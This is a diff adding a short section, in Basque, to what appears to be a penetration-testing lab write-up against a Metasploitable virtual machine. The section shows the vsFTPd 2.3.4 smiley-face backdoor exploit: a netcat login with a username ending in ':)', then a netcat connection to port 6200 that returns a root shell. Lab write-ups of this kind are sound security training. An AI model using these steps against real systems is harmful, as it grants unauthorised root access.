@@ -226,4 +226,23 @@ root
 root@metasploitable:~# 
 ```
 
+- 21 portua ahultasun bat du, 
+```
+┌──(kali㉿kali)-[~]
+└─$ nc 10.0.2.4 21
+220 (vsFTPd 2.3.4)
+user user:)
+331 Please specify the password.
+PASS 12345 
+```
 
+hau egin eta gero beste terminal batean
+```
+┌──(kali㉿kali)-[~]
+└─$ nc 10.0.2.4 6200
+whoami
+root
+
+
+
+```
